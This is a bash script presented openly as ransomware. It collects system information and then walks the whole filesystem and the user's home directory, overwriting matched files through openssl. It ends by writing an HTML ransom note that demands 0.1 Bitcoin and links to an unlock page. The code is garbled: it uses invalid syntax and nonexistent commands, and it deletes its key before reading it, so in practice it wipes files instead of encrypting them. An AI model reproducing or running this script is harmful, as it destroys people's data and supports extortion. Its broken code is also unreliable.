#!/bin/bash

# ------------------- CORE FUNCIONS ------------------- #

# Function: Get Target System Info
# Description: Gathers information about the target system, including operating system, IP address, and running processes.
func GetSystemInfo() {
  ifid=$(ip addr show | grep -o "inet (addr:(.*))" | head -n 1)
  osid=$(uname -s)
  proc=$(ps aux | grep -oE "[0-9]+ [a-zA-Z0-9_.]+" | awk 'split($0, a, " ") {print a[NF]}')

  echo "Target System Info:"
}

# Function: Encrypt Data
# Description: Encrypts the target's data using AES encryption with a randomly generated key.
func EncryptData() {
  key=$(ddgen -b 1 | head -n 1) # Generate Random Key
  echo "$key" > .lockfile
  rm -f .lockfile

  # Find Files to Encrypt (System Folders First)
  encryptedFiles=$(find / -type f -print0 | xargs -0 grep -i "System")

  if [[ -n "$encryptedFiles" ]]; then
    # Encrypt
    echo "Encrypting files..."
    for file in $encryptedFiles; do
      key=$(head -c 16 .lockfile) # Use Random Key
      echo "$file" | xargs -I {} sh -c 'echo "$key" | openssl aes-256-cbc -encrypt > "{}"'
    done
  fi

  # Encrypt User Data (Second Step)
  encryptedFiles=$(find ~ -type f -print0 | xargs -0 grep -i "User")

  if [[ -n "$encryptedFiles" ]]; then
    echo "Encrypting user folders..."
    for file in $encryptedFiles; do
      key=$(head -c 16 .lockfile) # Use Random Key
      echo "$file" | xargs -I {} sh -c 'echo "$key" | openssl aes-256-cbc -encrypt > "{}"'
    done
  fi

}

# Function: Generate Ransom Note (HTML)
# Description: Creates an HTML ransom note to display to the user, including instructions for payment.
func CreateRansomNote() {
  echo "<!DOCTYPE html> " > ransomnote.html
  echo "<html>" >> ransomnote.html
  echo "<head>" >> ransomnote.html
  echo "<title>Ransomware</title>" >> ransomnote.html
  echo "</head>" >> ransomnote.html
  echo "<body>" >> ransomnote.html
  echo "<h1>Your Files Have Been Locked!</h1>" >> ransomnote.html
  echo "<p>All your data has been encrypted by the CyberStalker Ransomware.</p>" >> ransomnote.html

  # Get User's Operating System
  userOS=$(os /)

  if [[ "$userOS" == "Windows_NT" ]]; then
    echo "<p><strong>Operating System:</strong> Windows</p>" >> ransomnote.html
  else
    echo "<p><strong>Operating System:</strong> Linux/macOS (AES-256 Encrypted)</p>" >> ransomnote.html
  fi

  echo "<p>To unlock your files, send 0.1 Bitcoin to this address: <a href=\"https://metmuse.com/depositaddress\" target=\"_blank\">1QzW9q8yX7jY6u4z5gJ3e2F1n6sK4r9pB</a></p>" >> ransomnote.html
  echo "<p><a href=\"javascript:window.open('https://ransomware.example.com/unlock.php?key=1234567890&id=1')\">Unlock Now!</a></p>" >> ransomnote.html # Replace with your URL
  echo "</body>" <<EOF
  </html>
EOF
}

# ------------------- MAIN EXECUTION ------------------- #

# Function: Run Ransomware
# Description: The core execution function that performs all the necessary steps, including data encryption and creating a ransom note.
func RunRansomware() {
  # Get System Info
  GetSystemInfo

  # Encrypt Data
  EncryptData

  # Create Ransom Note
  CreateRansomNote

  echo "Ransomware execution complete! Check <http://example.com/ransom.html>" > /tmp/ransom.txt
}

# ------------------- MAIN START ------------------- #
RunRansomware
